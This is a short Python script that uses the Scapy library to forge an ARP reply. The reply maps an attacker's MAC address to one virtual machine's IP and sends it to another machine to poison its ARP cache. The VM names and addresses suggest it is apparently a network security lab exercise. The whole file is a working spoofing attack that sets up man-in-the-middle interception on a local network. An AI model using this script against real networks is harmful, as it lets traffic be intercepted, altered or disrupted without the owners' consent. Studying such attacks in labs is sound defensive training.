#!/usr/bin/python3
from scapy.all import *
E = Ether(dst = '08:00:27:59:a3:c9', src = '08:00:27:17:de:fa')
# Mapping Attacker's MAC address with VM B's IP and sending to VM A's ARP cache
A = ARP(
    op = 2,
    hwsrc = '08:00:27:17:de:fa', psrc = '10.0.2.14',
    hwdst='08:00:27:59:a3:c9', pdst='10.0.2.13'
)
pkt = E/A
pkt.show()
sendp(pkt)